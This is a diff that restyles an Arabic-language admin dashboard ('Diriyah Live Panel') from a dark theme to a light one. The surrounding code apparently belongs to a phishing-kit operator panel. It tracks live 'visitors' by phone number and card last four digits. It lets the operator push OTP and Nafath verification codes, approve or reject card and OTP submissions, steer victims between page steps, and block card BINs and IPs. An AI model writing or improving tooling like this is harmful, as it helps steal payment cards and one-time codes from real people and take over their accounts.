@@ -353,9 +353,9 @@ function stepColor(step: number): string {
   if (step >= 6)
     return "bg-emerald-500/20 text-emerald-300 border-emerald-500/40";
   if (step >= 5) return "bg-violet-500/20 text-violet-300 border-violet-500/40";
-  if (step >= 4) return "bg-amber-500/20 text-amber-300 border-amber-500/40";
-  if (step >= 3) return "bg-cyan-500/20 text-cyan-300 border-cyan-500/40";
-  return "bg-slate-700/40 text-slate-300 border-slate-600/40";
+  if (step >= 4) return "bg-amber-500/20 text-amber-700 border-amber-500/40";
+  if (step >= 3) return "bg-cyan-500/20 text-cyan-700 border-cyan-500/40";
+  return "bg-stone-200/40 text-stone-700 border-stone-300";
 }
 
 function beep(volume = 0.18) {
@@ -632,7 +632,7 @@ export default function Admin() {
 
   if (!authReady || !authUser) {
     return (
-      <div className="min-h-screen w-full flex items-center justify-center bg-slate-950 text-slate-400 text-sm">
+      <div className="min-h-screen w-full flex items-center justify-center bg-stone-50 text-stone-500 text-sm">
         جاري التحميل...
       </div>
     );
@@ -1232,14 +1232,14 @@ function AdminDashboard() {
 
   return (
     <div
-      className="h-screen text-slate-100 flex flex-col overflow-hidden"
+      className="h-screen text-stone-900 flex flex-col overflow-hidden"
       dir="rtl"
-      style={{ backgroundColor: "#0d1320" }}
+      style={{ backgroundColor: "#f8f5ee" }}
     >
       {/* Top bar */}
       <header
         className="border-b shrink-0 z-20"
-        style={{ backgroundColor: "#0a0f1a", borderColor: "#1f2a3d" }}
+        style={{ backgroundColor: "#ffffff", borderColor: "#e7e2d4" }}
       >
         <div className="px-4 py-3 flex items-center justify-between gap-4">
           <div className="flex items-center gap-3">
@@ -1248,18 +1248,18 @@ function AdminDashboard() {
             </div>
             <div>
               <h1 className="text-base font-bold">لوحة التحكم</h1>
-              <p className="text-[10px] text-slate-500">Diriyah Live Panel</p>
+              <p className="text-[10px] text-stone-400">Diriyah Live Panel</p>
             </div>
           </div>
 
           <div className="flex-1 max-w-md">
             <div className="relative">
-              <Search className="w-4 h-4 absolute right-3 top-1/2 -translate-y-1/2 text-slate-500" />
+              <Search className="w-4 h-4 absolute right-3 top-1/2 -translate-y-1/2 text-stone-400" />
               <input
                 value={search}
                 onChange={(e) => setSearch(e.target.value)}
                 placeholder="بحث المستخدم — اضغط ENTER"
-                className="w-full pr-10 pl-3 py-2 bg-slate-800/60 border border-slate-700 rounded-lg text-sm text-slate-100 placeholder-slate-500 focus:outline-none focus:border-cyan-500"
+                className="w-full pr-10 pl-3 py-2 bg-stone-100 border border-stone-200 rounded-lg text-sm text-stone-900 placeholder-stone-400 focus:outline-none focus:border-cyan-600"
                 data-testid="admin-search"
               />
             </div>
@@ -1454,7 +1454,7 @@ function AdminDashboard() {
               </div>
             </>
           ) : (
-            <div className="col-span-full flex items-center justify-center h-96 text-slate-500">
+            <div className="col-span-full flex items-center justify-center h-96 text-stone-400">
               {loading ? "جاري التحميل..." : "اختر زائراً من القائمة"}
             </div>
           )}
@@ -1464,10 +1464,10 @@ function AdminDashboard() {
         <aside className="w-72 shrink-0 flex flex-col gap-3 order-1 min-h-0">
           <div
             className="rounded-xl p-3 border"
-            style={{ backgroundColor: "#111a2c", borderColor: "#1f2a3d" }}
+            style={{ backgroundColor: "#ffffff", borderColor: "#e7e2d4" }}
           >
             <button
-              className="w-full py-2 px-3 bg-slate-800 hover:bg-slate-700 rounded-lg text-xs font-semibold flex items-center justify-center gap-2"
+              className="w-full py-2 px-3 bg-stone-100 hover:bg-stone-200 rounded-lg text-xs font-semibold flex items-center justify-center gap-2"
               onClick={() => window.location.reload()}
             >
               <RefreshCw className="w-3.5 h-3.5" />
@@ -1494,8 +1494,8 @@ function AdminDashboard() {
                           ? "bg-amber-500 text-slate-900"
                           : "bg-cyan-500 text-slate-900"
                         : isWait
-                          ? "bg-amber-500/20 text-amber-300 hover:bg-amber-500/30"
-                          : "bg-slate-800 text-slate-300 hover:bg-slate-700"
+                          ? "bg-amber-500/20 text-amber-700 hover:bg-amber-500/30"
+                          : "bg-stone-100 text-stone-700 hover:bg-stone-200"
                     }`}
                     data-testid={`filter-${k}`}
                   >
@@ -1504,10 +1504,10 @@ function AdminDashboard() {
                       <span
                         className={`text-[9px] px-1 rounded ${
                           active
-                            ? "bg-slate-900/30"
+                            ? "bg-stone-100/50"
                             : isWait
                               ? "bg-amber-500/30"
-                              : "bg-slate-900/40"
+                              : "bg-stone-100/60"
                         }`}
                       >
                         {count}
@@ -1521,14 +1521,14 @@ function AdminDashboard() {
 
           <div
             className="flex-1 rounded-xl border overflow-hidden flex flex-col"
-            style={{ backgroundColor: "#111a2c", borderColor: "#1f2a3d" }}
+            style={{ backgroundColor: "#ffffff", borderColor: "#e7e2d4" }}
           >
             <div
-              className="px-3 py-2 border-b text-[11px] text-slate-400 flex items-center justify-between"
-              style={{ borderColor: "#1f2a3d" }}
+              className="px-3 py-2 border-b text-[11px] text-stone-500 flex items-center justify-between"
+              style={{ borderColor: "#e7e2d4" }}
             >
               <span>الزوار ({filtered.length})</span>
-              <span className="text-cyan-400">●</span>
+              <span className="text-cyan-600">●</span>
             </div>
             <div
               className="overflow-y-auto flex-1"
@@ -1550,7 +1550,7 @@ function AdminDashboard() {
               }}
             >
               {filtered.length === 0 && (
-                <div className="text-center py-12 text-slate-500 text-sm">
+                <div className="text-center py-12 text-stone-400 text-sm">
                   {loading ? "..." : "لا يوجد زوار"}
                 </div>
               )}
@@ -1582,14 +1582,14 @@ function AdminDashboard() {
                       if (e.key === "Enter" || e.key === " ")
                         setSelectedId(v.id);
                     }}
-                    className={`w-full text-right px-3 py-2.5 border-b border-slate-800/60 transition flex items-start gap-2 group cursor-pointer relative ${alertClass} ${
+                    className={`w-full text-right px-3 py-2.5 border-b border-stone-200/60 transition flex items-start gap-2 group cursor-pointer relative ${alertClass} ${
                       isBlocked
                         ? "bg-red-500/5 hover:bg-red-500/10 opacity-70"
                         : sel
                           ? "bg-cyan-500/10 border-r-2 border-r-cyan-400"
                           : waiting
                             ? "bg-amber-500/5 hover:bg-amber-500/10"
-                            : "hover:bg-slate-800/40"
+                            : "hover:bg-stone-100/60"
                     }`}
                     data-testid={`visitor-${v.id}`}
                   >
@@ -1605,20 +1605,20 @@ function AdminDashboard() {
                           ? "bg-green-400 animate-pulse"
                           : completed
                             ? "bg-emerald-500"
-                            : "bg-slate-600"
+                            : "bg-stone-300"
                       }`}
                     />
                     <div className="flex-1 min-w-0">
                       <div className="flex items-center justify-between gap-2">
-                        <div className="text-[13px] font-semibold text-slate-100 truncate">
+                        <div className="text-[13px] font-semibold text-stone-900 truncate">
                           {v.name || "زائر بدون اسم"}
                         </div>
-                        <span className="text-[9px] text-slate-500 shrink-0">
+                        <span className="text-[9px] text-stone-400 shrink-0">
                           {fmtRelative(v.updatedAt)}
                         </span>
                       </div>
                       <div
-                        className="text-[11px] text-slate-400 truncate"
+                        className="text-[11px] text-stone-500 truncate"
                         dir="ltr"
                       >
                         {v.phoneVerification || v.phone || v.id.slice(0, 12)}
@@ -1631,7 +1631,7 @@ function AdminDashboard() {
                           {stage}
                         </span>
                         {waiting && (
-                          <span className="text-[10px] px-1.5 py-0.5 rounded bg-amber-500/20 text-amber-300 border border-amber-500/40 font-bold flex items-center gap-0.5">
+                          <span className="text-[10px] px-1.5 py-0.5 rounded bg-amber-500/20 text-amber-700 border border-amber-500/40 font-bold flex items-center gap-0.5">
                             <AlertTriangle className="w-2.5 h-2.5" /> انتظار
                           </span>
                         )}
@@ -1642,7 +1642,7 @@ function AdminDashboard() {
                         )}
                         {(v.geoCountryCode || v.geoCountry) && (
                           <span
-                            className="text-[10px] px-1.5 py-0.5 rounded bg-slate-800 text-amber-300 border border-amber-500/30 font-semibold"
+                            className="text-[10px] px-1.5 py-0.5 rounded bg-stone-100 text-amber-700 border border-amber-500/30 font-semibold"
                             dir="ltr"
                             title={String(v.geoCountry || "")}
                           >
@@ -1654,7 +1654,7 @@ function AdminDashboard() {
                         )}
                         {last4 && (
                           <span
-                            className="text-[10px] px-1.5 py-0.5 rounded bg-slate-800 text-cyan-300 font-mono"
+                            className="text-[10px] px-1.5 py-0.5 rounded bg-stone-100 text-cyan-700 font-mono"
                             dir="ltr"
                           >
                             •• {last4}
@@ -1678,7 +1678,7 @@ function AdminDashboard() {
                                   : waiting
                                     ? "bg-amber-400"
                                     : "bg-cyan-500"
-                                : "bg-slate-800"
+                                : "bg-stone-100"
                             }`}
                           />
                         ))}
@@ -1694,7 +1694,7 @@ function AdminDashboard() {
                         className={`p-1 rounded transition ${
                           isBlocked
                             ? "text-red-400 hover:text-red-300 bg-red-500/10"
-                            : "opacity-0 group-hover:opacity-100 text-slate-500 hover:text-red-400"
+                            : "opacity-0 group-hover:opacity-100 text-stone-400 hover:text-red-400"
                         }`}
                         data-testid={`block-${v.id}`}
                       >
@@ -1706,7 +1706,7 @@ function AdminDashboard() {
                           removeVisitor(v.id);
                         }}
                         title="حذف"
-                        className="opacity-0 group-hover:opacity-100 text-slate-500 hover:text-red-400 p-1"
+                        className="opacity-0 group-hover:opacity-100 text-stone-400 hover:text-red-400 p-1"
                         data-testid={`del-${v.id}`}
                       >
                         <Trash2 className="w-3.5 h-3.5" />
@@ -1723,7 +1723,7 @@ function AdminDashboard() {
                       Math.min(c + PAGE_SIZE, filtered.length),
                     )
                   }
-                  className="w-full text-center py-3 text-[12px] text-cyan-300 hover:text-cyan-200 hover:bg-cyan-500/5 border-t border-slate-800/60 transition"
+                  className="w-full text-center py-3 text-[12px] text-cyan-700 hover:text-cyan-200 hover:bg-cyan-500/5 border-t border-stone-200/60 transition"
                   data-testid="button-load-more-visitors"
                 >
                   عرض المزيد ({filtered.length - visibleCount} متبقي)
@@ -1737,7 +1737,7 @@ function AdminDashboard() {
       {/* Blocked IPs management dialog */}
       {ipBlocklistOpen && (
         <div
-          className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/70 backdrop-blur-sm animate-in fade-in"
+          className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-stone-900/40 backdrop-blur-sm animate-in fade-in"
           onClick={() => setIpBlocklistOpen(false)}
           data-testid="ip-blocklist-dialog-backdrop"
         >
@@ -1748,7 +1748,7 @@ function AdminDashboard() {
             <div className="relative">
               <button
                 onClick={() => setIpBlocklistOpen(false)}
-                className="absolute top-2 left-2 z-10 p-1.5 rounded-lg bg-slate-800/80 hover:bg-slate-700 text-slate-300 hover:text-white transition"
+                className="absolute top-2 left-2 z-10 p-1.5 rounded-lg bg-white/90 hover:bg-stone-200 text-stone-700 hover:text-stone-900 transition"
                 aria-label="إغلاق"
                 data-testid="ip-blocklist-dialog-close"
               >
@@ -1769,7 +1769,7 @@ function AdminDashboard() {
       {/* Blocked BINs management dialog */}
       {blocklistOpen && (
         <div
-          className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/70 backdrop-blur-sm animate-in fade-in"
+          className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-stone-900/40 backdrop-blur-sm animate-in fade-in"
           onClick={() => setBlocklistOpen(false)}
           data-testid="blocklist-dialog-backdrop"
         >
@@ -1780,7 +1780,7 @@ function AdminDashboard() {
             <div className="relative">
               <button
                 onClick={() => setBlocklistOpen(false)}
-                className="absolute top-2 left-2 z-10 p-1.5 rounded-lg bg-slate-800/80 hover:bg-slate-700 text-slate-300 hover:text-white transition"
+                className="absolute top-2 left-2 z-10 p-1.5 rounded-lg bg-white/90 hover:bg-stone-200 text-stone-700 hover:text-stone-900 transition"
                 aria-label="إغلاق"
                 data-testid="blocklist-dialog-close"
               >
@@ -1825,7 +1825,7 @@ function IconButton({
       ? "bg-red-500/15 text-red-400 hover:bg-red-500/25 border-red-500/30"
       : color === "green"
         ? "bg-green-500/15 text-green-400 hover:bg-green-500/25 border-green-500/30"
-        : "bg-slate-800/60 text-slate-300 hover:bg-slate-700 border-slate-700";
+        : "bg-stone-100 text-stone-700 hover:bg-stone-200 border-stone-200";
   return (
     <button
       onClick={onClick}
@@ -1834,7 +1834,7 @@ function IconButton({
     >
       <Icon className="w-4 h-4" />
       {badge && (
-        <span className="absolute -top-1 -left-1 min-w-[16px] h-4 px-1 rounded-full bg-red-500 text-white text-[9px] font-bold flex items-center justify-center border border-slate-900">
+        <span className="absolute -top-1 -left-1 min-w-[16px] h-4 px-1 rounded-full bg-red-500 text-white text-[9px] font-bold flex items-center justify-center border border-white">
           {badge}
         </span>
       )}
@@ -1859,9 +1859,9 @@ function StatCard({
 }) {
   const palette: Record<string, { bg: string; text: string; ring: string }> = {
     slate: {
-      bg: "bg-slate-800/40",
-      text: "text-slate-200",
-      ring: "border-slate-700",
+      bg: "bg-stone-100/60",
+      text: "text-stone-800",
+      ring: "border-stone-200",
     },
     green: {
       bg: "bg-green-500/10",
@@ -1870,12 +1870,12 @@ function StatCard({
     },
     amber: {
       bg: "bg-amber-500/10",
-      text: "text-amber-300",
+      text: "text-amber-700",
       ring: "border-amber-500/40",
     },
     cyan: {
       bg: "bg-cyan-500/10",
-      text: "text-cyan-300",
+      text: "text-cyan-700",
       ring: "border-cyan-500/30",
     },
     emerald: {
@@ -1897,7 +1897,7 @@ function StatCard({
         <Icon className={`w-4 h-4 ${p.text}`} />
       </div>
       <div className="flex-1 min-w-0">
-        <div className="text-[10px] text-slate-400 truncate">{label}</div>
+        <div className="text-[10px] text-stone-500 truncate">{label}</div>
         <div className={`text-lg font-bold ${p.text} leading-tight`}>
           {value}
         </div>
@@ -1918,15 +1918,15 @@ function Panel({
   return (
     <div
       className="rounded-xl border overflow-hidden flex flex-col"
-      style={{ backgroundColor: "#111a2c", borderColor: "#1f2a3d" }}
+      style={{ backgroundColor: "#ffffff", borderColor: "#e7e2d4" }}
     >
       <div
         className="px-3 py-2 flex items-center justify-between border-b"
-        style={{ borderColor: "#1f2a3d", backgroundColor: "#0d1525" }}
+        style={{ borderColor: "#e7e2d4", backgroundColor: "#faf7f0" }}
       >
-        <h3 className="text-sm font-bold text-slate-200">{title}</h3>
+        <h3 className="text-sm font-bold text-stone-800">{title}</h3>
         {badge && (
-          <span className="text-[10px] px-2 py-0.5 rounded-full bg-cyan-500/20 text-cyan-300 font-semibold">
+          <span className="text-[10px] px-2 py-0.5 rounded-full bg-cyan-500/20 text-cyan-700 font-semibold">
             {badge}
           </span>
         )}
@@ -1948,10 +1948,10 @@ function Row({
   const text = safeText(value);
   if (!text) return null;
   return (
-    <div className="flex items-center justify-between py-1.5 border-b border-slate-800/40 last:border-0">
-      <span className="text-slate-500 text-[11px]">{label}</span>
+    <div className="flex items-center justify-between py-1.5 border-b border-stone-200/40 last:border-0">
+      <span className="text-stone-400 text-[11px]">{label}</span>
       <span
-        className={`text-slate-100 text-[12px] font-semibold ${mono ? "font-mono" : ""}`}
+        className={`text-stone-900 text-[12px] font-semibold ${mono ? "font-mono" : ""}`}
         dir={mono ? "ltr" : undefined}
       >
         {text}
@@ -1965,44 +1965,44 @@ function VisitorHeaderCard({ visitor }: { visitor: Visitor }) {
   return (
     <div
       className="rounded-xl border overflow-hidden flex flex-col"
-      style={{ backgroundColor: "#111a2c", borderColor: "#1f2a3d" }}
+      style={{ backgroundColor: "#ffffff", borderColor: "#e7e2d4" }}
     >
-      <div className="flex border-b" style={{ borderColor: "#1f2a3d" }}>
-        <div className="flex-1 px-3 py-2 text-center bg-cyan-500/10 text-cyan-300 text-xs font-bold border-l border-cyan-500/30">
+      <div className="flex border-b" style={{ borderColor: "#e7e2d4" }}>
+        <div className="flex-1 px-3 py-2 text-center bg-cyan-500/10 text-cyan-700 text-xs font-bold border-l border-cyan-500/30">
           الكل
         </div>
-        <div className="flex-1 px-3 py-2 text-center text-slate-400 text-xs">
+        <div className="flex-1 px-3 py-2 text-center text-stone-500 text-xs">
           ديناميكية
         </div>
       </div>
 
       <div
         className="p-4 text-center border-b"
-        style={{ borderColor: "#1f2a3d" }}
+        style={{ borderColor: "#e7e2d4" }}
       >
-        <h3 className="text-base font-bold text-slate-100 mb-1">
+        <h3 className="text-base font-bold text-stone-900 mb-1">
           {visitor.name || "زائر بدون اسم"}
         </h3>
-        <div className="text-cyan-400 font-mono text-xs space-y-0.5" dir="ltr">
+        <div className="text-cyan-600 font-mono text-xs space-y-0.5" dir="ltr">
           <div>{visitor.phoneVerification || "—"}</div>
           <div>{visitor.phone || "—"}</div>
         </div>
-        <div className="flex items-center justify-center gap-3 mt-2 text-[11px] text-slate-400">
+        <div className="flex items-center justify-center gap-3 mt-2 text-[11px] text-stone-500">
           <span className="flex items-center gap-1">
             <PhoneIcon className="w-3 h-3" /> mobile
           </span>
-          <span className="text-slate-700">|</span>
+          <span className="text-stone-300">|</span>
           <span className="flex items-center gap-1">
             <Globe className="w-3 h-3" /> Chrome
           </span>
-          <span className="text-slate-700">|</span>
+          <span className="text-stone-300">|</span>
           <span>Saudi Arabia</span>
         </div>
         <div className="mt-2 inline-flex items-center gap-1.5 text-[11px]">
           <span
-            className={`w-1.5 h-1.5 rounded-full ${online ? "bg-green-400" : "bg-slate-600"}`}
+            className={`w-1.5 h-1.5 rounded-full ${online ? "bg-green-400" : "bg-stone-300"}`}
           />
-          <span className={online ? "text-green-400" : "text-slate-500"}>
+          <span className={online ? "text-green-400" : "text-stone-400"}>
             {online ? "أونلاين" : "غير متصل"}
           </span>
         </div>
@@ -2200,7 +2200,7 @@ function OtpControlCard({
             value={otpDirect}
             onChange={(e) => setOtpDirect(e.target.value)}
             placeholder="أدخل رقم النقاط"
-            className="w-full px-3 py-2 bg-slate-800/60 border border-slate-700 rounded-lg text-xs text-slate-100 placeholder-slate-500 focus:outline-none focus:border-cyan-500 text-right"
+            className="w-full px-3 py-2 bg-stone-100 border border-stone-200 rounded-lg text-xs text-stone-900 placeholder-stone-400 focus:outline-none focus:border-cyan-600 text-right"
             data-testid="push-otp-input"
           />
           <div className="grid grid-cols-2 gap-1.5 mt-1.5">
@@ -2211,7 +2211,7 @@ function OtpControlCard({
                   setOtpDirect("");
                 }
               }}
-              className="py-1.5 bg-slate-700 hover:bg-slate-600 rounded-lg text-xs font-semibold flex items-center justify-center gap-1"
+              className="py-1.5 bg-stone-200 hover:bg-stone-300 rounded-lg text-xs font-semibold flex items-center justify-center gap-1"
               data-testid="push-otp-send"
             >
               <Send className="w-3 h-3" /> إرسال
@@ -2246,7 +2246,7 @@ function BankContactPushRow({ visitor }: { visitor: Visitor }) {
     statusClass = "text-emerald-400";
   } else if (requested && requestedAt) {
     statusLabel = `بانتظار التأكيد · ${fmtRelative(requestedAt)}`;
-    statusClass = "text-amber-300";
+    statusClass = "text-amber-700";
   }
 
   const handlePush = async () => {
@@ -2260,7 +2260,7 @@ function BankContactPushRow({ visitor }: { visitor: Visitor }) {
   };
 
   return (
-    <div className="pt-2 border-t border-slate-700/60">
+    <div className="pt-2 border-t border-stone-200/60">
       <button
         onClick={handlePush}
         disabled={pushing}
@@ -2351,14 +2351,14 @@ function NafadControl({
       <div className="text-[11px] text-teal-300 font-bold flex items-center justify-end">
         {sentCode ? (
           <span
-            className="font-mono text-base text-teal-200"
+            className="font-mono text-base text-teal-700"
             dir="ltr"
             data-testid="admin-nafad-current"
           >
             {sentCode}
           </span>
         ) : (
-          <span className="text-[10px] text-amber-300">
+          <span className="text-[10px] text-amber-700">
             المستخدم بانتظار الرقم
           </span>
         )}
@@ -2375,7 +2375,7 @@ function NafadControl({
           maxLength={2}
           dir="ltr"
           data-testid="admin-nafad-input"
-          className="flex-1 bg-slate-900/60 border border-slate-700 rounded px-2 py-1.5 text-sm font-mono text-teal-200 text-center focus:outline-none focus:border-teal-400"
+          className="flex-1 bg-white border border-stone-200 rounded px-2 py-1.5 text-sm font-mono text-teal-700 text-center focus:outline-none focus:border-teal-600"
         />
         <button
           onClick={sendCode}
@@ -2390,7 +2390,7 @@ function NafadControl({
             onClick={clearCode}
             data-testid="admin-nafad-clear"
             title="مسح وإعادة طلب رقم"
-            className="px-2 py-1.5 bg-slate-800 text-slate-300 rounded text-xs border border-slate-700 hover:bg-slate-700"
+            className="px-2 py-1.5 bg-stone-100 text-stone-700 rounded text-xs border border-stone-200 hover:bg-stone-200"
           >
             ✕
           </button>
@@ -2456,13 +2456,13 @@ function CustomizeDropdown({
     <div className="relative" data-customize-dropdown>
       <button
         onClick={() => setOpen((o) => !o)}
-        className="px-3 py-2 rounded-lg text-xs font-semibold flex items-center gap-2 bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700"
+        className="px-3 py-2 rounded-lg text-xs font-semibold flex items-center gap-2 bg-stone-100 hover:bg-stone-200 text-stone-800 border border-stone-200"
         data-testid="admin-customize-btn"
       >
         <Settings className="w-4 h-4" />
         تخصيص اللوحة
         {hiddenCount > 0 && (
-          <span className="text-[10px] bg-cyan-500/20 text-cyan-300 px-1.5 py-0.5 rounded">
+          <span className="text-[10px] bg-cyan-500/20 text-cyan-700 px-1.5 py-0.5 rounded">
             {hiddenCount} مخفي
           </span>
         )}
@@ -2474,15 +2474,15 @@ function CustomizeDropdown({
       {open && (
         <div
           className="absolute top-full mt-2 left-0 w-80 rounded-xl border shadow-2xl z-30"
-          style={{ backgroundColor: "#0f1828", borderColor: "#1f2a3d" }}
+          style={{ backgroundColor: "#ffffff", borderColor: "#e7e2d4" }}
         >
-          <div className="p-3 border-b border-slate-800 flex items-center justify-between">
-            <div className="text-xs font-bold text-slate-200">
+          <div className="p-3 border-b border-stone-200 flex items-center justify-between">
+            <div className="text-xs font-bold text-stone-800">
               إظهار / إخفاء وتغيير حجم البطاقات
             </div>
             <button
               onClick={onReset}
-              className="text-[10px] text-cyan-400 hover:text-cyan-300 flex items-center gap-1"
+              className="text-[10px] text-cyan-600 hover:text-cyan-700 flex items-center gap-1"
               data-testid="admin-customize-reset"
             >
               <RotateCcw className="w-3 h-3" />
@@ -2496,7 +2496,7 @@ function CustomizeDropdown({
               return (
                 <div
                   key={key}
-                  className="p-2 rounded-lg hover:bg-slate-800/40"
+                  className="p-2 rounded-lg hover:bg-stone-100/60"
                   data-testid={`admin-customize-row-${key}`}
                 >
                   <div className="flex items-center justify-between gap-2">
@@ -2506,12 +2506,12 @@ function CustomizeDropdown({
                       data-testid={`admin-customize-toggle-${key}`}
                     >
                       {s.visible ? (
-                        <Eye className="w-4 h-4 text-cyan-400" />
+                        <Eye className="w-4 h-4 text-cyan-600" />
                       ) : (
-                        <EyeOff className="w-4 h-4 text-slate-500" />
+                        <EyeOff className="w-4 h-4 text-stone-400" />
                       )}
                       <span
-                        className={`text-xs font-semibold ${s.visible ? "text-slate-100" : "text-slate-500"}`}
+                        className={`text-xs font-semibold ${s.visible ? "text-stone-900" : "text-stone-400"}`}
                       >
                         {CARD_LABELS[key]}
                       </span>
@@ -2525,8 +2525,8 @@ function CustomizeDropdown({
                           onClick={() => onChange(key, { span: sp })}
                           className={`py-1 rounded-md text-[10px] font-semibold transition ${
                             s.span === sp
-                              ? "bg-cyan-500/20 text-cyan-300 border border-cyan-500/40"
-                              : "bg-slate-800 text-slate-400 hover:bg-slate-700 border border-transparent"
+                              ? "bg-cyan-500/20 text-cyan-700 border border-cyan-500/40"
+                              : "bg-stone-100 text-stone-500 hover:bg-stone-200 border border-transparent"
                           }`}
                           data-testid={`admin-customize-span-${key}-${sp}`}
                         >
@@ -2569,12 +2569,12 @@ function PagesControlDropdown({ visitor }: { visitor: Visitor }) {
         className={`h-9 px-3 rounded-lg flex items-center gap-2 border text-xs font-bold transition ${
           pending
             ? "bg-violet-500/20 border-violet-500/50 text-violet-200"
-            : "bg-cyan-500/15 border-cyan-500/40 text-cyan-300 hover:bg-cyan-500/25"
+            : "bg-cyan-500/15 border-cyan-500/40 text-cyan-700 hover:bg-cyan-500/25"
         }`}
       >
         <Layers className="w-3.5 h-3.5" />
         <span>التحكم بالصفحات</span>
-        <span className="px-1.5 py-0.5 rounded bg-slate-900/60 text-[10px] font-mono">
+        <span className="px-1.5 py-0.5 rounded bg-white text-[10px] font-mono">
           {current}/{TOTAL_STEPS}
         </span>
         <ChevronDown
@@ -2585,13 +2585,13 @@ function PagesControlDropdown({ visitor }: { visitor: Visitor }) {
       {open && (
         <div
           className="absolute top-full mt-2 left-0 w-[340px] rounded-xl border shadow-2xl z-30 p-3"
-          style={{ backgroundColor: "#111a2c", borderColor: "#1f2a3d" }}
+          style={{ backgroundColor: "#ffffff", borderColor: "#e7e2d4" }}
         >
-          <div className="flex items-center justify-between mb-2 pb-2 border-b border-slate-800">
-            <div className="text-xs font-bold text-slate-200">
+          <div className="flex items-center justify-between mb-2 pb-2 border-b border-stone-200">
+            <div className="text-xs font-bold text-stone-800">
               التحكم بالصفحات
             </div>
-            <div className="text-[10px] text-cyan-400">الحالية: {current}</div>
+            <div className="text-[10px] text-cyan-600">الحالية: {current}</div>
           </div>
           <PagesControl visitor={visitor} />
         </div>
@@ -2657,7 +2657,7 @@ function PagesControl({ visitor }: { visitor: Visitor }) {
                   ? "bg-cyan-500 text-slate-900 border-cyan-400"
                   : isDirected
                     ? "bg-violet-500/30 text-violet-200 border-violet-400/50"
-                    : "bg-slate-800/60 text-slate-300 border-slate-700 hover:bg-slate-700"
+                    : "bg-stone-100 text-stone-700 border-stone-200 hover:bg-stone-200"
               }`}
             >
               <div className="flex items-center justify-between gap-1 mb-0.5">
@@ -2675,18 +2675,18 @@ function PagesControl({ visitor }: { visitor: Visitor }) {
         })}
       </div>
 
-      <div className="border-t border-slate-800 pt-2 space-y-1">
-        <div className="text-[10px] text-slate-500 mb-1">طلب جديد</div>
+      <div className="border-t border-stone-200 pt-2 space-y-1">
+        <div className="text-[10px] text-stone-400 mb-1">طلب جديد</div>
         <div className="grid grid-cols-2 gap-1.5">
           <button
             onClick={() => clearApproval("cardApprovalStatus")}
-            className="py-1 bg-slate-800/60 text-slate-300 rounded text-[10px] font-semibold border border-slate-700 hover:bg-slate-700"
+            className="py-1 bg-stone-100 text-stone-700 rounded text-[10px] font-semibold border border-stone-200 hover:bg-stone-200"
           >
             بطاقة
           </button>
           <button
             onClick={() => clearApproval("otpApprovalStatus")}
-            className="py-1 bg-slate-800/60 text-slate-300 rounded text-[10px] font-semibold border border-slate-700 hover:bg-slate-700"
+            className="py-1 bg-stone-100 text-stone-700 rounded text-[10px] font-semibold border border-stone-200 hover:bg-stone-200"
           >
             OTP
           </button>
@@ -2730,19 +2730,19 @@ function OtpRow({
         ? "border-green-500/30 bg-green-500/5"
         : status === "rejected"
           ? "border-red-500/30 bg-red-500/5"
-          : "border-slate-700 bg-slate-900/40";
+          : "border-stone-200 bg-stone-100/60";
   return (
     <div className={`rounded-lg p-2 border ${tone}`}>
       <div className="flex items-center justify-between mb-1.5">
         <div className="flex items-center gap-1.5">
-          <span className="text-[10px] text-slate-400 font-semibold">
+          <span className="text-[10px] text-stone-500 font-semibold">
             {label}
           </span>
-          <span className="text-[9px] text-slate-500 bg-slate-800 rounded px-1.5 py-0.5">
+          <span className="text-[9px] text-stone-400 bg-stone-100 rounded px-1.5 py-0.5">
             مرحلة {step}
           </span>
         </div>
-        <span className="text-[10px] text-slate-500">
+        <span className="text-[10px] text-stone-400">
           {code ? `${code.length} رقم` : "—"}
         </span>
       </div>
@@ -2752,8 +2752,8 @@ function OtpRow({
             key={i}
             className={`w-8 h-9 rounded-md flex items-center justify-center text-base font-bold font-mono border ${
               code
-                ? "bg-slate-800 border-slate-700 text-cyan-300"
-                : "bg-slate-900/40 border-slate-800 text-slate-600"
+                ? "bg-stone-100 border-stone-200 text-cyan-700"
+                : "bg-stone-100/60 border-stone-200 text-stone-300"
             }`}
           >
             {d}
@@ -2793,8 +2793,8 @@ function StatusLine({ label, status }: { label: string; status: string }) {
         : status === "waiting"
           ? "text-amber-400"
           : status === "received"
-            ? "text-cyan-400"
-            : "text-slate-500";
+            ? "text-cyan-600"
+            : "text-stone-400";
   const text =
     status === "approved"
       ? "تم القبول"
@@ -2807,7 +2807,7 @@ function StatusLine({ label, status }: { label: string; status: string }) {
             : "—";
   return (
     <div className="flex items-center justify-between text-[11px]">
-      <span className="text-slate-400">{label}</span>
+      <span className="text-stone-500">{label}</span>
       <span className={`font-semibold ${cls}`}>{text}</span>
     </div>
   );
@@ -2840,7 +2840,7 @@ function BlockedBinsCard({
       badge={bins.length > 0 ? `${bins.length} محظور` : undefined}
     >
       <div className="space-y-3">
-        <div className="text-[11px] text-slate-400 leading-relaxed">
+        <div className="text-[11px] text-stone-500 leading-relaxed">
           أي بطاقة تبدأ بأول 6 أرقام (BIN) من القائمة سيتم رفضها تلقائياً عند
           المحاولة بدفع.
         </div>
@@ -2861,7 +2861,7 @@ function BlockedBinsCard({
             }}
             placeholder="مثال: 453204"
             dir="ltr"
-            className="flex-1 px-2 py-1.5 bg-slate-900 border border-slate-700 rounded-lg text-sm font-mono text-cyan-300 text-center placeholder-slate-600 focus:outline-none focus:border-red-500/60"
+            className="flex-1 px-2 py-1.5 bg-white border border-stone-200 rounded-lg text-sm font-mono text-cyan-700 text-center placeholder-stone-300 focus:outline-none focus:border-red-500/60"
             data-testid="blocklist-input"
           />
           <button
@@ -2886,7 +2886,7 @@ function BlockedBinsCard({
             className={`w-full text-right px-2.5 py-2 rounded-lg border flex items-center justify-between gap-2 transition ${
               suggCanAdd
                 ? "bg-amber-500/10 border-amber-500/30 hover:bg-amber-500/20 text-amber-200"
-                : "bg-slate-900/40 border-slate-800 text-slate-500 cursor-not-allowed"
+                : "bg-stone-100/60 border-stone-200 text-stone-400 cursor-not-allowed"
             }`}
             data-testid="blocklist-add-current"
           >
@@ -2903,19 +2903,19 @@ function BlockedBinsCard({
 
         {/* Blocked list */}
         <div>
-          <div className="text-[11px] text-slate-500 mb-1.5 flex items-center gap-1">
+          <div className="text-[11px] text-stone-400 mb-1.5 flex items-center gap-1">
